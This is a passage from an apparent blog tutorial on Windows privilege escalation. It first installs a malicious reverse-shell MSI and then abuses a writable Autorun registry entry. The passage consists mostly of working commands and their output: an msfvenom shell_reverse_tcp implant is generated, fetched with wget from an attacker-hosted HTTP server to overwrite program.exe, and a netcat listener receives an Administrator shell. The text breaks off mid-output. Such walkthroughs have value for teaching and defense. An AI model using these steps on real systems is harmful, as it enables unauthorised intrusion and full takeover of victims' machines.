+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo python3 -m http.server
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Download the malicious MSI file to the current working directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">wget </span><span class="mf">192.168</span><span class="p">.</span><span class="py">146</span><span class="p">.</span><span class="mf">128</span><span class="err">:</span><span class="mf">8000</span><span class="p">/</span><span class="n">reverse</span><span class="p">.</span><span class="py">msi</span> <span class="n">-o</span> <span class="n">reverse</span><span class="p">.</span><span class="py">msi</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Attempt to install reverse.msi by executing the following command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"> <span class="p">.\</span><span class="n">reverse</span><span class="p">.</span><span class="py">msi</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In the UAC, click <code>Yes</code> and wait for the connection:</p>
+<figure><a class="lightgallery" href="/images/posts/registry-uac.png" title="/images/posts/registry-uac.png" data-thumbnail="/images/posts/registry-uac.png" data-sub-html="<h2>UAC Registry</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/registry-uac.png"
+            data-srcset="/images/posts/registry-uac.png, /images/posts/registry-uac.png 1.5x, /images/posts/registry-uac.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/registry-uac.png" />
+    </a><figcaption class="image-caption">UAC Registry</figcaption>
+    </figure>
+<p>Receive the connection:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo nc -lvnp <span class="m">443</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-autorun-registry">Privilege Escalation via Autorun Registry</h1>
+<p>Run PowerShell or the command prompt as administrator and then create the directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="nb">md </span><span class="s2">&#34;C:\Program Files\Autorun Program&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">Directory</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Mode</span>                 <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
+</span></span><span class="line"><span class="cl"><span class="p">----</span>                 <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">-----</span>          <span class="mf">3</span><span class="p">/</span><span class="mf">6</span><span class="p">/</span><span class="mf">2022</span>   <span class="mf">8</span><span class="err">:</span><span class="mf">03</span> <span class="n">PM</span>                <span class="n">Autorun</span> <span class="n">Program</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Add a dummy program:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="nb">copy </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">locator</span><span class="p">.</span><span class="py">exe</span> <span class="s2">&#34;C:\Program Files\Autorun Program\program.exe&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Grant to the <code>Everyone</code> group full permissions:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="n">icacls</span> <span class="s2">&#34;C:\Program Files\Autorun Program\program.exe&#34;</span> <span class="p">/</span><span class="n">grant</span> <span class="s2">&#34;Authenticated Users:F&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">processed</span> <span class="n">file</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Autorun</span> <span class="n">Program</span><span class="p">\</span><span class="n">program</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl"><span class="n">Successfully</span> <span class="n">processed</span> <span class="mf">1</span> <span class="n">files</span><span class="p">;</span> <span class="n">Failed</span> <span class="n">processing</span> <span class="mf">0</span> <span class="n">files</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Add the program to run at startup via registry:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="n">reg</span> <span class="n">add</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">software</span><span class="p">\</span><span class="n">microsoft</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">currentversion</span><span class="p">\</span><span class="n">run</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&#34;My Program&#34;</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="p">/</span><span class="n">d</span> <span class="s2">&#34;C:\Program Files\Autorun Program\program.exe&#34;</span> <span class="p">/</span><span class="n">f</span>
+</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">operation</span> <span class="n">completed</span> <span class="n">successfully</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="nb">dir </span><span class="s2">&#34;C:\Program Files\Autorun Program\program.exe&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">Directory</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Autorun</span> <span class="n">Program</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Mode</span>                 <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
+</span></span><span class="line"><span class="cl"><span class="p">----</span>                 <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
+</span></span><span class="line"><span class="cl"><span class="n">-a</span><span class="p">----</span>          <span class="mf">6</span><span class="p">/</span><span class="mf">5</span><span class="p">/</span><span class="mf">2021</span>   <span class="mf">8</span><span class="err">:</span><span class="mf">05</span> <span class="n">AM</span>          <span class="mf">28672</span> <span class="n">program</span><span class="p">.</span><span class="py">exe</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can review the permissions:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\&gt;</span> <span class="n">icacls</span> <span class="s2">&#34;C:\Program Files\Autorun Program\program.exe&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Autorun</span> <span class="n">Program</span><span class="p">\</span><span class="n">program</span><span class="p">.</span><span class="py">exe</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">Users</span><span class="err">:</span><span class="p">(</span><span class="n">F</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                             <span class="n">Everyone</span><span class="err">:</span><span class="p">(</span><span class="n">F</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                             <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                             <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                             <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">RX</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                             <span class="n">APPLICATION</span> <span class="n">PACKAGE</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">ALL</span> <span class="n">APPLICATION</span> <span class="n">PACKAGES</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">RX</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                             <span class="n">APPLICATION</span> <span class="n">PACKAGE</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">ALL</span> <span class="n">RESTRICTED</span> <span class="n">APPLICATION</span> <span class="n">PACKAGES</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">RX</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Successfully</span> <span class="n">processed</span> <span class="mf">1</span> <span class="n">files</span><span class="p">;</span> <span class="n">Failed</span> <span class="n">processing</span> <span class="mf">0</span> <span class="n">files</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Alternatively, we can use accesschk from SysInternals:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SysinternalsSuite</span><span class="p">\</span><span class="n">accesschk64</span><span class="p">.</span><span class="py">exe</span> <span class="n">-accepteula</span> <span class="n">-wvu</span> <span class="s2">&#34;C:\Program Files\Autorun Program&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Accesschk</span> <span class="n">v6</span><span class="p">.</span><span class="py">14</span> <span class="p">-</span> <span class="n">Reports</span> <span class="n">effective</span> <span class="n">permissions</span> <span class="k">for</span> <span class="n">securable</span> <span class="n">objects</span>
+</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="err">⌐</span> <span class="mf">2006</span><span class="p">-</span><span class="mf">2021</span> <span class="n">Mark</span> <span class="n">Russinovich</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sysinternals</span> <span class="p">-</span> <span class="n">www</span><span class="p">.</span><span class="py">sysinternals</span><span class="p">.</span><span class="py">com</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Autorun</span> <span class="n">Program</span><span class="p">\</span><span class="n">program</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Medium</span> <span class="na">Mandatory</span> <span class="n">Level</span> <span class="p">(</span><span class="k">Default</span><span class="p">)</span> <span class="p">[</span><span class="nb">No-Write</span><span class="n">-Up</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="n">RW</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">Users</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FILE_ALL_ACCESS</span>
+</span></span><span class="line"><span class="cl">  <span class="n">RW</span> <span class="n">Everyone</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FILE_ALL_ACCESS</span>
+</span></span><span class="line"><span class="cl">  <span class="n">RW</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FILE_ALL_ACCESS</span>
+</span></span><span class="line"><span class="cl">  <span class="n">RW</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FILE_ALL_ACCESS</span>
+</span></span><span class="line"><span class="cl">  <span class="n">RW</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FILE_ALL_ACCESS</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From the output above we can see that the &ldquo;<code>NT AUTHORITY\Authenticated Users</code>&rdquo; user group has &ldquo;<code>FILE_ALL_ACCESS</code>&rdquo; permission on the &ldquo;program.exe&rdquo; file.</p>
+<p>Open command prompt or PowerShell as <strong>administrator</strong> and run the Autoruns GUI app:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SysinternalsSuite</span><span class="p">\</span><span class="n">Autoruns64</span><span class="p">.</span><span class="py">exe</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>Note: If the Autoruns64.exe GUI doesn&rsquo;t show the &ldquo;My Program&rdquo; autorun registry key, try executing as administrator first.</p>
+</blockquote>
+<p>In Autoruns, click on the ‘Logon’ tab and from the listed results, notice that the “My Program” entry is pointing to “<code>C:\Program Files\Autorun Program\program.exe</code>”:</p>
+<figure><a class="lightgallery" href="/images/posts/autoruns-program.exe.png" title="/images/posts/autoruns-program.exe.png" data-thumbnail="/images/posts/autoruns-program.exe.png" data-sub-html="<h2>AutoRuns Program</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/autoruns-program.exe.png"
+            data-srcset="/images/posts/autoruns-program.exe.png, /images/posts/autoruns-program.exe.png 1.5x, /images/posts/autoruns-program.exe.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/autoruns-program.exe.png" />
+    </a><figcaption class="image-caption">AutoRuns Program</figcaption>
+    </figure>
+<p>The command line version of autoruns is <code>autorunsc.exe</code> (can be executed as medium-integrity level / low privileged user):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Autorun</span> <span class="n">Program</span><span class="p">&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SysinternalsSuite</span><span class="p">\</span><span class="n">autorunsc64</span><span class="p">.</span><span class="py">exe</span> <span class="n">-accepteula</span> <span class="n">-a</span> <span class="n">l</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Sysinternals</span> <span class="n">Autoruns</span> <span class="n">v14</span><span class="p">.</span><span class="py">09</span> <span class="p">-</span> <span class="n">Autostart</span> <span class="n">program</span> <span class="n">viewer</span>
+</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mf">2002</span><span class="p">-</span><span class="mf">2022</span> <span class="n">Mark</span> <span class="n">Russinovich</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sysinternals</span> <span class="p">-</span> <span class="n">www</span><span class="p">.</span><span class="py">sysinternals</span><span class="p">.</span><span class="py">com</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;...</span><span class="py">SNIP</span><span class="p">...&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HKLM</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">Run</span>
+</span></span><span class="line"><span class="cl">   <span class="n">SecurityHealth</span>
+</span></span><span class="line"><span class="cl">     <span class="k">%</span><span class="n">windir</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">SecurityHealthSystray</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl">     <span class="n">Windows</span> <span class="n">Security</span> <span class="n">notification</span> <span class="n">icon</span>
+</span></span><span class="line"><span class="cl">     <span class="n">Microsoft</span> <span class="n">Corporation</span>
+</span></span><span class="line"><span class="cl">     <span class="mf">10.0</span><span class="p">.</span><span class="py">22000</span><span class="p">.</span><span class="py">65</span>
+</span></span><span class="line"><span class="cl">     <span class="n">c:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">securityhealthsystray</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl">     <span class="mf">12</span><span class="p">/</span><span class="mf">2</span><span class="p">/</span><span class="mf">1926</span> <span class="mf">7</span><span class="err">:</span><span class="mf">27</span> <span class="n">PM</span>
+</span></span><span class="line"><span class="cl">   <span class="n">VMware</span> <span class="n">User</span> <span class="k">Process</span>
+</span></span><span class="line"><span class="cl">     <span class="s2">&#34;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&#34;</span> <span class="n">-n</span> <span class="n">vmusr</span>
+</span></span><span class="line"><span class="cl">     <span class="n">VMware</span> <span class="n">Tools</span> <span class="n">Core</span> <span class="n">Service</span>
+</span></span><span class="line"><span class="cl">     <span class="n">VMware</span><span class="p">,</span> <span class="n">Inc</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">     <span class="mf">11.3</span><span class="p">.</span><span class="py">5</span><span class="p">.</span><span class="py">31214</span>
+</span></span><span class="line"><span class="cl">     <span class="n">c:</span><span class="p">\</span><span class="n">program</span> <span class="n">files</span><span class="p">\</span><span class="n">vmware</span><span class="p">\</span><span class="n">vmware</span> <span class="n">tools</span><span class="p">\</span><span class="n">vmtoolsd</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl">     <span class="mf">8</span><span class="p">/</span><span class="mf">31</span><span class="p">/</span><span class="mf">2021</span> <span class="mf">5</span><span class="err">:</span><span class="mf">27</span> <span class="n">AM</span>
+</span></span><span class="line"><span class="cl">   <span class="n">My</span> <span class="n">Program</span>
+</span></span><span class="line"><span class="cl">     <span class="s2">&#34;C:\Program Files\Autorun Program\program.exe&#34;</span>
+</span></span><span class="line"><span class="cl">     <span class="n">c:</span><span class="p">\</span><span class="n">program</span> <span class="n">files</span><span class="p">\</span><span class="n">autorun</span> <span class="n">program</span><span class="p">\</span><span class="n">program</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;...</span><span class="py">SNIP</span><span class="p">...&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Since we have write permissions to <code>C:\Program Files\Autorun Program\program.exe</code> we can replace it with a payload or an implant. In this case, I will generate an executable reverse shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.119.130 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -f exe -o implant.exe
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
+</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
+</span></span><span class="line"><span class="cl">Payload size: <span class="m">460</span> bytes
+</span></span><span class="line"><span class="cl">Final size of exe file: <span class="m">7168</span> bytes
+</span></span><span class="line"><span class="cl">Saved as: implant.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then I will setup an HTTP listener on my attacker machine:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo python3 -m http.server <span class="m">80</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> kali:
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Transfer and replace the original executable with PowerShell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\&gt;</span> <span class="nb">wget </span><span class="mf">192.168</span><span class="p">.</span><span class="py">119</span><span class="p">.</span><span class="mf">130</span><span class="p">/</span><span class="n">implant</span><span class="p">.</span><span class="py">exe</span> <span class="n">-O</span> <span class="s2">&#34;C:\Program Files\Autorun Program\program.exe&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On the attacker machine, we will set up a listener:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nc -lvnp <span class="m">443</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now let&rsquo;s sign out and sign in as Administrator and wait a bit, once we have waited we should receive a connection as the Administrator user:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nc -lvnp <span class="m">443</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.119.130<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.119.129<span class="o">]</span> <span class="m">58708</span>
+</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.22000.318<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami /all
+</span></span><span class="line"><span class="cl">whoami /all
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">USER INFORMATION
+</span></span><span class="line"><span class="cl">----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User Name                     <span class="nv">SID</span>                                  
